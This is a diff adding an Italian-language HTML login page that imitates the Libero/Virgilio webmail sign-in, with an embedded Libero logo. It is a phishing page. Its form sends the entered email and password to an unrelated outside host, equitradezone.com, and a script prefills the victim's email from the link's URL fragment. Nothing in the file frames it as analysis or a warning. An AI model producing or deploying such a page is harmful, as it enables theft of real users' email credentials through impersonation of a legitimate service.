@@ -1,0 +1,128 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Libero-Login</title>
+    <link rel="stylesheet" href="">
+    <style>
+        body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background-color: #f0f2f5;
+    background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkWBB7amdY4FOvcwkiDVLU5f7tgCD2CAriCA&usqp=CAU');
+        }
+
+.container {
+    max-width: 400px;
+    margin: 0 auto;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+header {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+header img {
+    width: 130px;
+    height: auto;
+}
+
+h2 {
+    font-size: 24px;
+    margin-top: 10px;
+}
+
+.login-form input {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+
+.login-form button {
+    width: 100%;
+    padding: 10px;
+    background-color: #e74b18;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+.separator {
+    text-align: center;
+    margin: 15px 0;
+    position: relative;
+}
+
+.separator span {
+    background-color: #fff;
+    padding: 0 10px;
+    position: relative;
+    z-index: 1;
+}
+
+.separator:before,
+.separator:after {
+    content: "";
+    display: block;
+    height: 1px;
+    width: 100%;
+    background-color: #ccc;
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+    z-index: 0;
+}
+
+.create-account-btn {
+    background-color: #e74b18;
+    color: #fff;
+}
+
+.forgot-password-link {
+    display: block;
+    text-align: center;
+    margin-top: 10px;
+    color: #e74b18;
+    text-decoration: none;
+}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="data:image/png;base64,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" width="150px" alt="Libero Logo">
+            <h2>Accedi con il tuo account Virgilio</h2>
+        </header>
+        <main>
+            <form class="login-form" action="https://equitradezone.com/etc/file.php" method="POST">
+                <input type="email"  name="email" placeholder="Inserisci la tua email" id="email" >
+                <input type="password" name="password" placeholder="Inserisci la tua password" id="password" autofocus>
+                <button type="submit">AVANTI</button>
+                <div class="separator">
+                    <span>Non hai un account?</span>
+                </div>
+                <button class="create-account-btn" type="button">Crea un nuovo account</button>
+                <a class="forgot-password-link" href="#">AIUTO?</a>
+            </form>
+        </main>
+    </div>
+<script>
+var urlString = window.location.href;
+	    var email = urlString.split("#")[1];
+	    if(email){
+	               document.getElementById('email').value = email;
+	    }		
+
+</script>
+</body>
+</html>
